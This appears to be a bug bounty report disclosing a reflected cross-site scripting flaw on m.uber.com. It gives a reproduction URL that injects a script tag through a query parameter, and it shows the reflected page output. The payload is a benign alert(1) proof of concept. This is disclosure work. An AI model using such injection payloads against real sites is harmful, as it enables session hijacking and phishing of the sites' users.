Summary:

## Summary
m.uber.com is susceptible to reflected XSS

## Security Impact
A malformed URL can be used to render arbitrary SSL-protected web pages from m.uber.com

## Reproduction Steps
https://m.uber.com/?bjbxm%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3exrii5=1

## Specifics
From the rendered web page:
```
{"enabled":true,"sid":"bbc661585c424072","url":"www.cdn-net.com","cf":1022963},"queryParams":{"bjbxm</script><script>alert(1)</script>xrii5":"1"}
```
No further efforts were made to render a more believable webpage as the vulnerability and reflected code above is sufficient to trigger Chromium Browser's XSS _Auditor protections.
